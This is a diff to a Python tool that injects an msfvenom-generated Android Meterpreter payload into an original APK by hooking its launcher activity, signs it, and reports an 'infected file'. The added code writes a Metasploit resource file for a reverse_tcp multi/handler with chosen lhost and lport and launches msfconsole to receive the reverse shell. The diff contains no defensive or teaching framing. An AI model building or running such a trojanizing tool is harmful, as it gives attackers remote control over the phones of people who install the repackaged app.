@@ -5,6 +5,7 @@ import sys
 import errno
 import os
 import shutil
+import time
 
 import xml.etree.ElementTree as ET
 
@@ -67,7 +68,7 @@ def isInstalled(program):
     return out != ""
 
 
-def run_meterpreter(command):
+def generate_meterpreter(command):
     """ executes meterpreter with the options 
         given in the 'command' argument """
     proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
@@ -78,12 +79,32 @@ def run_meterpreter(command):
         print out
         sys.exit(1)
 
+def start_meterpreter_handler():
+    # TODO option take local ip or given ip?
+    # TODO make inrerface dynamic
+    #command = "ifconfig wlan0 | grep \"inet \" | awk -F'[: ]+' '{ print $4 }'"
+    #proc = subprocess.Popen(command, stdout=subprocess.PIPE,shell=True)
+    #(localip, err) = proc.communicate()
+    localip = args['meterpreter_ip']
+    print "[*] Start the handler for meterpreter on IP: " + str(localip) + " Port: " + args['meterpreter_port']
+    with open("meterpreter_options.txt", "w") as f:
+        f.write("use exploit/multi/handler\n")
+        f.write("set payload android/meterpreter/reverse_tcp\n")
+        f.write("set lhost " + str(localip) + "\n")
+        f.write("set lport " + args['meterpreter_port'] + "\n")
+        f.write("exploit\n")
+    
+    command = "msfconsole -r meterpreter_options.txt"
+    proc = subprocess.Popen(command, shell=True)
+    (out, err) = proc.communicate()
+
+
 
 def run_jarsigner(command):
     """ executes the jarsigner with specific options 
         given in the 'command' argument"""
     full_command = "jarsigner " + command
-    proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
+    proc = subprocess.Popen(full_command, stdout=subprocess.PIPE, shell=True)
     (out, err) = proc.communicate()
     print out
     print err
@@ -108,7 +129,11 @@ def main():
         sys.exit(1)
 
     if not args['metasploit_used']:
-        print "metasploit is required to run application, please activate metasploit"
+        print "metasploit is required to run application, please specify the --meterprezer_ip and --meterpreter_port in the patameters"
+        sys.exit(1)
+    
+    if not args['original_apk']:
+        print "Please specify the path to the original apk with the -o parameter"
         sys.exit(1)
 
     print "[*] Generating msfvenom payload..\n"
@@ -118,7 +143,7 @@ def main():
     command = "msfvenom " + args['meterpreter_arguments'] + " 2>&1"
     print str(command)
 
-    run_meterpreter(command)
+    generate_meterpreter(command)
 
     print "[*] Signing payload..\n"
     run_jarsigner(
@@ -146,6 +171,7 @@ def main():
     smali_file = 'original/_decompiled/smali/{}.smali'.format(launcher_activity[0].replace(".", "/"))
 
     print smali_file
+    time.sleep(10)
 
     print "[*] Copying payload files..\n"
     hookedsmali = smali_converter.generate_hooked_smali(smali_file)
@@ -171,12 +197,16 @@ def main():
 
     # clean up
     print "[*] Clean up intermediate state ..\n"
-    shutil.rmtree('original/')
-    shutil.rmtree('payload/')
+    #shutil.rmtree('original/')
+    ##shutil.rmtree('payload/')
 
     os.remove("original.apk")
     os.remove("payload.apk")
     print "[+] Infected file " + injected_apk + " ready.\n"
 
+     
+    if args['metasploit_used']:
+        print "[*] Start the handler for meterpreter on IP: " + args['meterpreter_ip'] + " Port: " + args['meterpreter_port']
+        start_meterpreter_handler()
 
 main()
